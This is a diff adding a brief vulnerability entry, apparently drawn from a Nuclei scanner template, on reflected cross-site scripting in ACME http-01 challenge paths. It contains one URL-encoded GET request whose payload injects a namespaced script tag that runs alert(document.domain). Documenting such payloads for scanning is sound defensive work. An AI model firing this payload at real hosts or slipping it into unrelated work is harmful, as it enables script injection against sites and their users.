@@ -1,0 +1,12 @@
+# Vulnerability: ACME Challenge Path - Reflected Cross-Site Scripting
+**Classification:** CWE-80
+**Source:** Nuclei Template (`acme-challenge-path-xss.yaml`)
+
+## Description
+Detects XSS vulnerabilities in ACME http-01 challenge implementations where hosting providers reflect the challenge key from the URL without proper sanitization
+
+## Vulnerable Code Pattern / Exploit Payload
+```http
+GET {{BaseURL}}/.well-known/acme-challenge/%3C%3fxml%20version=%221.0%22%3f%3E%3Cx:script%20xmlns:x=%22http://www.w3.org/1999/xhtml%22%3Ealert%28document.domain%26%23x29%3B%3C/x:script%3E
+```
+
